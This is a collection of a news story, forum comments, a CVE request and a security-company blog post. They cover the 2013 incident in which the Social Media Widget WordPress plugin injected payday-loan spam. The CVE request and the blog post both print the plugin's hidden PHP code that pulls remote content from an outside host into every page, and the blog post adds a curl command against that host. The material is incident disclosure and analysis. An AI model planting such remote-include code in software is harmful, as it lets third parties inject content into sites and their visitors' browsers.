chicksdaddy writes *"[Social Media Widget](http://wordpress.org/extend/plugins/social-media-widget/), a free plug-in for the WordPress blogging platform with more than a million downloads, was [restored to WordPress's official plugin directory on Thursday](http://securityledger.com/hacked-wordpress-plug-in-put-on-double-secret-probation/), days after it was found [injecting WordPress websites with spam links](http://blog.sucuri.net/2013/04/wordpress-plugin-social-media-widget.html) to web sites offering Pay Day Loans. In a post on a support forum for Social Media Widget (SMW), Samuel Wood, a WordPress administrator, said that WordPress was [willing to give SMW and its owner a second chance](http://wordpress.org/support/topic/social-media-widget-401) after he claimed to have been the victim of a contract developer gone rogue. 'Naturally we do take a very hard line on spam, and obviously an author putting malicious code into a plugin is enough grounds for us to bring down the ban hammer,' Wood wrote on Friday. 'But there are natural circumstances where an author may not be at fault.' SMW appears to be such a case. It is one of the 20 most popular WordPress add-ons and allows WordPress web site operators to include links to their other social media accounts. Brendan Sheehan, the owner of SMW, said, 'We trusted the wrong people with our plugin code and take full responsibility. We are a marketing company at heart and are not actually developers, so in order to provide major updates and improvements, we had to seek outside help. Some of these people deceived us and abused our trust and naivety...We will not make this mistake again.' Wood said the folks at Wordpress decided to accept that story — but that they're watching SMW closely. 'Basically, the current maintainer is not a professional programmer, and put his trust in the wrong freelancers to do the coding work for him...We'll be watching the plugin for changes,' he said. 'The plugin is back up for now, and as long as it stays clean, it's fine.'"*

    I know! We'll write everything in-house instead! Once I've got my custom language compiling, I'll start work on the relational database engine. We should have the site finished some time in 2030.

    Sooner or later, you're going to have to trust someone else's code. I guarantee you, whatever projects you work on, you're using someone else's code for something, and probably sight-unseen.

      Firstly I want to make it clear I don't think it's a matter of being a "PHP dev" that makes people stupid, since I'm a freelancer myself and am sometimes forced to use PHP.

        You can not trust every single piece of code you see while at the same time reusing other people's code, it's naive to make the leap of logic you did.

        And I never said you did; the leap of "logic" was on the part of the GP, not me. He said, and I paraphrase, if you install code you haven't reviewed, you deserve whatever you get. I said that, sooner or later, you must trust **some** code, not that every random piece of code is worthy of trust.

        And in this case, it's quite possible that people **did** perform a review of this plugin; after all, it hasn't been spamming the whole time it's been available. They performed an update on their plugin without vetting the update. Sure, that's not best practice, but I do the same thing on my personal computer at home all the time, even if I don't do it on my production systems. If I hosted a podunk little blog on Wordpress? I probably wouldn't vet every "security patch" for every plugin I used either.

        GP is a great big case of "blame the victim" mentality. Someone was malicious. They deliberately inserted malicious code into a trusted repository.

        I recently broke my WordPress cherry, and I have to say the experience was extremely frustrating because 90% of the resources are not aimed at "developers" or even "PHP developers". Trying to find any real information about the API was incredibly frustrating.

        The entire WordPress ecosystem seems to oriented towards semi-technical users who just want to click this thing and copy some files around. Basically people with blogs and brochure-ware sites who want a twitter icon without opening a text editor.

      It's not **everyone**'s code you can't trust.

      It's only (1) the code you will actually distribute with your software, and (2) uncommon dependencies that are not part of widely used software packages.

      And even then, you **have** to be able to trust the code of people working for you; e.g. the coders you hire.
      If you can't do that, then you can't get anything done.

      So you should check into their background, and make sure the people you hire to make your code are either under a good contract or surety bond that protects your interest, and effects some risk transfer by providing you the right to sue for damages, especially, in case of obvious or provable malice.

      That way you align your worker's interest with yours, by ensuring that if they conduct an intentional abuse they are at risk.

  That's a nice attitude to have. "The author of this plugin was caught injecting malicious code into every website using it, but we'll keep it on the downloads page so long as he agrees to follow the honour system?"

  How fucking stupid do you have to be?

  For f\*cks sake, there's no reason a supervisor shouldn't at least run a diff of the code and recompile (if applicable) before pushing a release. Unless there are huge changes, it shouldn't take more than 10 minutes. If anything looks really weird or out of place, start asking questions, preferably to someone else.

If they're not developers, why are they a company to begin with?

        But is that because the programmers/companies which do take out insurance are exactly the group who care about their reputation and business and so would be less likely to need to use the insurance anyway?

        If you start mandating that all companies need insurance, then I think you'll see premiums increase because the ratio of bad to good developers will increase.

So the company responsible for Social Media Widget claims that a rogue
developer they contracted inserted this code:

470
471	 $smw_url = "hxxp://i.aaur.net/i.php";
472	 if(!function_exists("smw_get")){
473	 function smw_get($f) {
474	 $response = wp_remote_get( $f );
475	 if( is_wp_error( $response ) ) {
476	 function smw_get_body($f) {
477	 $ch = @curl_init();
478	 @curl_setopt($ch, CURLOPT_URL, $f);
479	 @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
480	 $output = @curl_exec($ch);
481	 @curl_close($ch);
482	 return $output;
483	 }
484	 echo smw_get_body($f);
485	 } else {
486	 echo $response["body"];
487	 }
488	 }
489	 smw_get($smw_url);
490	 }

Regardless of HOW this code got into the plugin it represents a
significant security issue. Any site using this plugin is pulling
"hxxp://i.aaur.net/i.php" and including it in the page they generate
and send to a user. This opens up a huge can of worms, anyone that can
man in the middle your server can now inject PHP into your blog, ot
anything sent to the clients/etc.

Please use CVE-2013-1949 for this issue.

# WordPress Plugin Social Media Widget Hiding Spam – Remove it now

  [![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g)](https://blog.sucuri.net/author/dcid)   [Daniel Cid](https://blog.sucuri.net/author/dcid)

* April 9, 2013

Authored by [Daniel Cid](https://twitter.com/danielcid) and [Tony Perez](https://twitter.com/perezbox).

If you are using the Social Media Widget plugin (social-media-widget), make sure to remove it immediately from your website. We discovered it is being used to inject spam into websites and it has also been [removed from the WordPress Plugin repository](http://wordpress.org/extend/plugins/).

This is a very popular plugin with more than 900,000 downloads. It has the potential to impact a lot of websites.

![Screen Shot 2013-04-09 at 11.03.12 AM](https://blog.sucuri.net/wp-content/uploads/2013/04/Screen-Shot-2013-04-09-at-11.03.12-AM-300x151.png)

##### Technical details

The plugin has a hidden call to this URL: httx://i.aaur.net/i.php, which is used to inject “Pay Day Loan” spam into the web sites running the plugin. This is how it looks like in the browser:

> function nemoViewState( ){
>  var a=0,m,v,t,z,x=new …
>  <p class="nemonn"><a href="httx://paydaypam.co. uk/" title="Payday Loan">payday loans

The malicious code was added only 12 days ago when they launched the version 4.0 of the plugin. So we are recommending that everyone removes that plugin immediately until we have more information. Our free [SiteCheck scanner](http://sitecheck.sucuri.net) does identify if your site has been injected with this type of SPAM.

This is the code that was added to the plugin:

> 470
>  471 $smw\_url = "hxxp://i.aaur.net/i.php";
>  472 if(!function\_exists("smw\_get")){
>  473 function smw\_get($f) {
>  474 $response = wp\_remote\_get( $f );
>  475 if( is\_wp\_error( $response ) ) {
>  476 function smw\_get\_body($f) {
>  477 $ch = @curl\_init();
>  478 @curl\_setopt($ch, CURLOPT\_URL, $f);
>  479 @curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
>  480 $output = @curl\_exec($ch);
>  481 @curl\_close($ch);
>  482 return $output;
>  483 }
>  484 echo smw\_get\_body($f);
>  485 } else {
>  486 echo $response["body"];
>  487 }
>  488 }
>  489 smw\_get($smw\_url);
>  490 }

The code itself is very simply. You can see where they are pulling the malicious url on line 471. The rest is just error handling and embedding the injection.

In fact, if you want to try it safely, simply open your friendly terminal and run:

> curl -D – hxxp://i.aaur.net/i.php

You’ll get something like this:

[![Screen Shot 2013-04-09 at 10.29.13 AM](https://blog.sucuri.net/wp-content/uploads/2013/04/Screen-Shot-2013-04-09-at-10.29.13-AM.png)](https://blog.sucuri.net/2013/04/wordpress-plugin-social-media-widget.html/screen-shot-2013-04-09-at-10-29-13-am)

You can clearly see the injection and in return the SPAM being injected. Now in this case you’re only seeing the injection, but once this is embedded in your website it’ll hide itself amongst all your other code, making it all that harder for you as a website owner to find. But exceptionally easy for search engines, like Google to flag.

### The Real Concern

What is really concerning about this, isn’t even the SPAM injection. That happens all the time, it’s the fact that the malicious payload found it’s way in the core files. It was then uploaded to the WordPress.org Plugin Repository.

You can see what they did by looking at their changes:

This is version 4.0:
 <http://plugins.trac.wordpress.org/changeset?reponame=&new=688632%40social-media-widget%2Ftrunk%2Fsocial-widget.php&old=676169%40social-media-widget%2Ftrunk%2Fsocial-widget.php>

They then updated 4.0, to better streamline the code:
 <http://plugins.trac.wordpress.org/changeset?reponame=&new=691839%40social-media-widget%2Ftrunk%2Fsocial-widget.php&old=688632%40social-media-widget%2Ftrunk%2Fsocial-widget.php>

Then 17 hours ago it was removed: <http://plugins.trac.wordpress.org/changeset?reponame=&new=693941%40social-media-widget%2Ftrunk%2Fsocial-widget.php&old=691839%40social-media-widget%2Ftrunk%2Fsocial-widget.php>

It was likely Otto that removed it based on his response [in the forums](http://wordpress.org/support/topic/anyone-know-why-social-media-widget-was-removed):

> We forced an update to remove the discovered malware from already existing sites, however I highly recommend that you find another plugin.

So what does this tell us?

Well we know it’s not a vulnerability in the code, it’s an intentional injection, designed to compromise thousands. Very intelligent, but the question is by who.

First, the attacker is doing this directly to the core of the plugin. So, either it’s the author, or his credentials are compromised. Being that it was injected then modified it’s probably safe to say someone has access and they are not doing very nice things with it.

Second, kudos to the core team on finding and resolving the issue. It does however make you sit back and wonder, is this one isolated incident or is the going to be the new attack vector? If it’s the latter it causes grave concern, again demonstrating that the biggest vulnerability we all suffer is ourselves and our access.

   Looks like they have released an update that fixes the problem. I scanned my site after and it came up clean.

   It appears WordPress updated the plugin and then removed it:

   The malware was found and the plugin was delisted yesterday. Version 4.0.1 of the plugin does not contain the spam code, and will be shown normally as an available update for the plugin in the WordPress dashboard, even though the plugin remains delisted.

      Otto, so does that mean the plugin will be listed on wp.org in a few days again? From the forum it sounded like you thought it was best to remove the plugin entirely.

      1. ![](https://secure.gravatar.com/avatar/0994d5e2e158a24ba8017c2525d78263?s=60&d=mm&r=g) **[Otto](http://ottodestruct.com)** says: [April 9, 2013 at 1:14 pm](https://blog.sucuri.net/2013/04/wordpress-plugin-social-media-widget.html#comment-2471)

         We don’t relist plugins when they have malware intentionally inserted into them by their owners. The plugin will very likely not be returning.

         Normally in these cases we don’t “fix” plugins either. In the past, we’ve simply replaced them with a do-nothing plugin and thus wipe the offending code off the map entirely. However, given that the code change is relatively small, and many use the plugin, eliminating that functionality from them all at once seemed extreme.

         Nevertheless, I suggest finding an alternative plugin.

            If it is prove-able that his login information was compromised and that it was not an intentional addition by the original developer, why not re-list a plugin that is deemed safe? Let alone, a plugin with this much use?

               I am in communication with the current author and am working it out. At present, there is no sign of a compromised account.

               After working with the author and reviewing the code, the plugin has been re-listed and will be receiving an update soon. This was not a case of a compromised account, but it was the case of an author trusting the wrong person.

   I just want to make it clear that I have not been the maintainer of Social Media Widget since January of 2013 (version 2.9.7).

   This post is to disassociate myself with this issue. I want the record to reflect that this issue arose months after I passed off the widget and have not had SVN access since signing over the widget in January. As the original creator of Social Media Widget and beginning its legacy, I want to remain clean of this in the case I decide to release a new WordPress plugin.

   I had a discussion with the current maintainer whom I transferred the rights over to – It seems that one of the freelancers that he hired to do some updates decided to go rogue or his password was cracked, though you will have to hear it from him for the full story.

   I used another plugin “Google Analytics” Malicious, which did the same and placed an iframe and some links inside it and placed in the top of my website, thanks to this link [http://www.dnexpert.com/2013/03/16/website-hacked-removing-the-google-analytics-malicious-wordpress-plugin/﻿](http://www.dnexpert.com/2013/03/16/website-hacked-removing-the-google-analytics-malicious-wordpress-plugin/%EF%BB%BF), i solved that issue.

      Yes. 3.3 was also affected, but the code was slightly different. They went from 3.3 to 4.0. They made the code less apparent in 4.0 and then Otto and his team removed the malicious code and pushed out 4.0.1. Upgrade to 4.0.1, but as Otto has stated several other places, it’s best to just remove the plugin all together.

   The malware is also in version 3.3 of the Social Media Widget Plugin according to a scan on this site. Seems to me the problem is older than noted.

   The patch that streamlines the malware piece, also has a legit bugfix in it. What are the chances of a compromise so smart that waits for you to commit to actually make the changes?

    *“Being that it was injected then modified it’s probably safe to say someone has access and they are not doing very nice things with it.”*
     I’d say the good news is that a person with potentially deep access chose such a trivial, obvious way to celebrate the busted security. The bad news is that it calls into question exactly every other module, and every subsequent build.

    What a shame. This has been a very like-able plug-in.

    What I want to know is how to remove the injection if your site was hit with it?

       The best way is to upgrade the plugin as mentioned above, or remove it all together and find an alternative.

    I wonder if anybody considers filing a police/FBI report. They advertise a social media plugin and instead they make YOUR system do spam. USC § 1030. This is not just a few lines of code. This is a crime.

    Removed the plug-in. The developer lost my trust. I’ve installed an alternative: Active Bits Social Sharing Toolkit. <http://www.active-bits.nl/support/social-sharing-toolkit/> . Simple to configure and offered a bit more features and flexibility too.

    Thanks for the informative article. I have assumed that if a plugin has lots of downloads, positive feedback and several updates it is safe to install. I’m glad you’re on watch for problems like this.

    Would you mind telling us what you use for your Facebook like widget?
